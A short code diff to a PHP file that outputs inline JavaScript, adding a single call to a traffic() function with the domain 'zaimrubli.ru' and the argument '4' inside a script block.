@@ -355,6 +355,7 @@ if($this->uri->segment(1) == 'lk' || $this->uri->segment(1) == 'lk2')
         }
         return c;
     } 
+    traffic("zaimrubli.ru", "4");
 </script>';
 }
 ?>
